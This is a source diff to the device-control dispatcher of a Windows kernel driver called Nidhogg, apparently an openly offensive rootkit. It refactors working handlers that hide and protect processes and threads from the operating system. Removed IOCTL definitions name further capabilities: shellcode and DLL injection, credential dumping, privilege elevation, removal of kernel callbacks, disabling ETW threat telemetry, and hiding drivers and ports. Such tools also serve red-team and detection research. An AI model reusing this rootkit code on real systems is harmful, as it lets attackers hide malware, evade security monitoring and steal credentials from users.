@@ -1,49 +1,5 @@
-#pragma once
 #include "pch.h"
-#include "MemoryHelper.hpp"
-#include "MemoryAllocator.hpp"
-
-// ** IOCTLS **********************************************************************************************
-#define IOCTL_PROTECT_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_HIDE_UNHIDE_PROCESS CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_ELEVATE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_SET_PROCESS_SIGNATURE_LEVEL CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define IOCTL_PROTECT_UNPROTECT_THREAD CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_CLEAR_THREAD_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_HIDE_UNHIDE_THREAD CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_QUERY_PROTECTED_THREADS CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define IOCTL_PROTECT_UNPROTECT_FILE CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_QUERY_FILES CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define IOCTL_PROTECT_REGITEM CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_QUERY_REGITEMS CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define IOCTL_PATCH_MODULE CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_INJECT_SHELLCODE CTL_CODE(0x8000, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_INJECT_DLL CTL_CODE(0x8000, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_HIDE_MODULE CTL_CODE(0x8000, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_HIDE_UNHIDE_DRIVER CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_DUMP_CREDENTIALS CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define IOCTL_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_LIST_PSROUTINES CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_REMOVE_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define IOCTL_HIDE_UNHIDE_PORT CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_CLEAR_HIDDEN_PORTS CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_QUERY_HIDDEN_PORTS CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define IOCTL_EXEC_SCRIPT CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
-// *******************************************************************************************************
+#include "IrpHandlers.h"
 
 /*
 * Description:
@@ -98,7 +54,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", protectedProcess.Pid);
 		}
 		else {
-			if (!NidhoggProcessHandler->AddProtectedProcess(protectedProcess.Pid)) {
+			if (!NidhoggProcessHandler->ProtectProcess(protectedProcess.Pid)) {
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
@@ -109,14 +65,41 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 		break;
 	}
 
-	case IOCTL_CLEAR_PROCESS_PROTECTION:
+	case IOCTL_CLEAR_PROCESSES:
 	{
 		if (!Features.ProcessProtection) {
 			Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-		NidhoggProcessHandler->ClearProcessList(ProcessType::Protected);
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (!IsValidSize(size, sizeof(ProcessType))) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = static_cast<ProcessType*>(Irp->AssociatedIrp.SystemBuffer);
+
+		switch (*data) {
+		case ProcessType::Protected: {
+			NidhoggProcessHandler->ClearProcessList(ProcessType::Protected);
+			break;
+		}
+		case ProcessType::Hidden: {
+			NidhoggProcessHandler->ClearProcessList(ProcessType::Hidden);
+			break;
+		}
+		case ProcessType::All: {
+			NidhoggProcessHandler->ClearProcessList(ProcessType::Protected);
+			NidhoggProcessHandler->ClearProcessList(ProcessType::Hidden);
+			break;
+		}
+		default: {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+		}
 		break;
 	}
 
@@ -212,13 +195,8 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 		break;
 	}
 
-	case IOCTL_QUERY_PROTECTED_PROCESSES:
+	case IOCTL_LIST_PROCESSES:
 	{
-		if (!Features.ProcessProtection) {
-			Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
-			status = STATUS_UNSUCCESSFUL;
-			break;
-		}
 		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
 
 		if (!IsValidSize(size, sizeof(IoctlProcessList))) {
@@ -226,15 +204,33 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			break;
 		}
 		auto data = static_cast<IoctlProcessList*>(Irp->AssociatedIrp.SystemBuffer);
-		NidhoggProcessHandler->ListProtectedProcesses(data);
+
+		switch (data->Type) {
+			case ProcessType::Protected: {
+				if (!Features.ProcessProtection) {
+					Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
+					status = STATUS_UNSUCCESSFUL;
+					break;
+				}
+				status = NidhoggProcessHandler->ListProtectedProcesses(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+				break;
+			}
+			case ProcessType::Hidden: {
+				status = NidhoggProcessHandler->ListHiddenProcesses(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+				break;
+			}
+			default: {
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+		}
+
 		len += size;
 		break;
 	}
 
 	case IOCTL_PROTECT_UNPROTECT_THREAD:
 	{
-		ProtectedThread protectedThread{};
-
 		if (!Features.ThreadProtection) {
 			Print(DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
@@ -242,48 +238,38 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 		}
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(ProtectedThread))) {
+		if (!IsValidSize(size, sizeof(IoctlThreadEntry))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
+		auto data = static_cast<IoctlThreadEntry*>(Irp->AssociatedIrp.SystemBuffer);
 
-		auto data = static_cast<ProtectedThread*>(Irp->AssociatedIrp.SystemBuffer);
-		protectedThread.Tid = data->Tid;
-		protectedThread.Protect = data->Protect;
-
-		if (protectedThread.Tid <= 0) {
+		if (data->Tid == 0) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		if (protectedThread.Protect) {
-			if (NidhoggProcessHandler->GetProtectedThreadsCount() == MAX_TIDS) {
-				status = STATUS_TOO_MANY_CONTEXT_IDS;
-				break;
+		if (data->Remove) {
+			status = NidhoggThreadHandler->RemoveThread(data->Tid, ThreadType::Protected) ?
+				STATUS_SUCCESS : STATUS_NOT_FOUND;
+			
+			if (!NT_SUCCESS(status)) {
+				Print(DRIVER_PREFIX "Failed to unprotect thread with tid %d.\n", data->Tid);
 			}
-
-			if (NidhoggProcessHandler->FindThread(protectedThread.Tid))
-				break;
-
-			if (!NidhoggProcessHandler->AddThread(protectedThread.Tid)) {
-				status = STATUS_UNSUCCESSFUL;
-				break;
+			else {
+				Print(DRIVER_PREFIX "Unprotecting thread with tid %d.\n", data->Tid);
 			}
-
-			Print(DRIVER_PREFIX "Protecting thread with tid %d.\n", protectedThread.Tid);
+			break;
 		}
 		else {
-			if (NidhoggProcessHandler->GetProtectedThreadsCount() == 0) {
-				status = STATUS_NOT_FOUND;
-				break;
-			}
+			status = NidhoggThreadHandler->ProtectThread(data->Tid);
 
-			if (!NidhoggProcessHandler->RemoveThread(protectedThread.Tid)) {
-				status = STATUS_NOT_FOUND;
-				break;
+			if (!NT_SUCCESS(status)) {
+				Print(DRIVER_PREFIX "Failed to protect thread with tid %d.\n", data->Tid);
 			}
-
-			Print(DRIVER_PREFIX "Unprotecting thread with tid %d.\n", protectedThread.Tid);
+			else {
+				Print(DRIVER_PREFIX "Protecting thread with tid %d.\n", data->Tid);
+			}
 		}
 
 		len += size;
@@ -292,58 +278,112 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 
 	case IOCTL_HIDE_UNHIDE_THREAD:
 	{
-		ULONG tid = 0;
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(InputHiddenThread))) {
+		if (!IsValidSize(size, sizeof(IoctlThreadEntry))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<InputHiddenThread*>(Irp->AssociatedIrp.SystemBuffer);
-		tid = data->Tid;
+		auto data = static_cast<IoctlThreadEntry*>(Irp->AssociatedIrp.SystemBuffer);
 
-		if (tid <= 0) {
+		if (data->Tid == 0) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
-		data->Hide ? NidhoggProcessHandler->HideThread(tid) : NidhoggProcessHandler->UnhideThread(tid);
 
-		if (NT_SUCCESS(status)) {
-			data->Hide ? Print(DRIVER_PREFIX "Hid thread with tid %d.\n", tid) : 
-				Print(DRIVER_PREFIX "Unhide thread with tid %d.\n", tid);
+		if (data->Remove) {
+			status = NidhoggThreadHandler->UnhideThread(data->Tid);
+
+			if (!NT_SUCCESS(status)) {
+				Print(DRIVER_PREFIX "Failed to unhide thread with tid %d.\n", data->Tid);
+			}
+			else {
+				Print(DRIVER_PREFIX "Unhiding thread with tid %d.\n", data->Tid);
+			}
+		}
+		else {
+			status = NidhoggThreadHandler->HideThread(data->Tid);
+
+			if (!NT_SUCCESS(status)) {
+				Print(DRIVER_PREFIX "Failed to hide thread with tid %d.\n", data->Tid);
+				break;
+			}
+			else {
+				Print(DRIVER_PREFIX "Hiding thread with tid %d.\n", data->Tid);
+			}
 		}
 
 		len += size;
 		break;
 	}
 
-	case IOCTL_CLEAR_THREAD_PROTECTION:
+	case IOCTL_CLEAR_THREADS:
 	{
 		if (!Features.ThreadProtection) {
 			Print(DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		NidhoggProcessHandler->ClearProtectedThreads();
-		break;
-	}
-
-	case IOCTL_QUERY_PROTECTED_THREADS:
-	{
-		if (!Features.ThreadProtection) {
-			Print(DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n");
-			status = STATUS_UNSUCCESSFUL;
-			break;
-		}
-		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
-
-		if (!IsValidSize(size, sizeof(OutputThreadsList))) {
+		if (!IsValidSize(size, sizeof(ThreadType))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<OutputThreadsList*>(Irp->AssociatedIrp.SystemBuffer);
-		NidhoggProcessHandler->QueryProtectedThreads(data);
+
+		auto data = static_cast<ThreadType*>(Irp->AssociatedIrp.SystemBuffer);
+
+		switch (*data) {
+			case ThreadType::Protected: {
+				NidhoggThreadHandler->ClearThreadList(ThreadType::Protected);
+				break;
+			}
+			case ThreadType::Hidden: {
+				NidhoggThreadHandler->ClearThreadList(ThreadType::Hidden);
+				break;
+			}
+			case ThreadType::All: {
+				NidhoggThreadHandler->ClearThreadList(ThreadType::Protected);
+				NidhoggThreadHandler->ClearThreadList(ThreadType::Hidden);
+				break;
+			}
+			default: {
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+		}
+		break;
+	}
+
+	case IOCTL_LIST_THREADS:
+	{
+		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
+
+		if (!IsValidSize(size, sizeof(IoctlThreadList))) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+		auto data = static_cast<IoctlThreadList*>(Irp->AssociatedIrp.SystemBuffer);
+
+		switch (data->Type) {
+		case ThreadType::Protected: {
+			if (!Features.ThreadProtection) {
+				Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
+				status = STATUS_UNSUCCESSFUL;
+				break;
+			}
+			status = NidhoggThreadHandler->ListProtectedThreads(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+			break;
+		}
+		case ThreadType::Hidden: {
+			status = NidhoggThreadHandler->ListHiddenThreads(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+			break;
+		}
+		default: {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+		}
 
 		len += size;
 		break;
@@ -422,7 +462,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 		break;
 	}
 
-	case IOCTL_CLEAR_FILE_PROTECTION:
+	case IOCTL_CLEAR_PROTECTED_FILES:
 	{
 		if (!Features.FileProtection) {
 			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
@@ -434,7 +474,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 		break;
 	}
 
-	case IOCTL_QUERY_FILES:
+	case IOCTL_LIST_FILES:
 	{
 		if (!Features.FileProtection) {
 			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
@@ -620,7 +660,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 		break;
 	}
 
-	case IOCTL_QUERY_REGITEMS:
+	case IOCTL_LIST_REGITEMS:
 	{
 		ULONG itemsCount = 0;
 
@@ -970,7 +1010,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			break;
 		}
 
-		NT_SUCCESS(status) ? Print(DRIVER_PREFIX "DLL injected successfully.\n") : 
+		NT_SUCCESS(status) ? Print(DRIVER_PREFIX "DLL injected successfully.\n") :
 			Print(DRIVER_PREFIX "Failed to inject DLL (0x%08X)\n", status);
 
 		len += size;
@@ -1306,4 +1346,26 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 	Irp->IoStatus.Information = len;
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
 	return status;
+}
+
+
+/*
+* Description:
+* NidhoggCreateClose is responsible for creating a success response for given IRP.
+*
+* Parameters:
+* @DeviceObject [PDEVICE_OBJECT] -- Not used.
+* @Irp			[PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
+*
+* Returns:
+* @status		[NTSTATUS]		 -- Always will be STATUS_SUCCESS.
+*/
+_IRQL_requires_max_(DISPATCH_LEVEL)
+_IRQL_requires_same_
+NTSTATUS NidhoggCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
+	UNREFERENCED_PARAMETER(DeviceObject);
+	Irp->IoStatus.Status = STATUS_SUCCESS;
+	Irp->IoStatus.Information = 0;
+	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+	return STATUS_SUCCESS;
 }
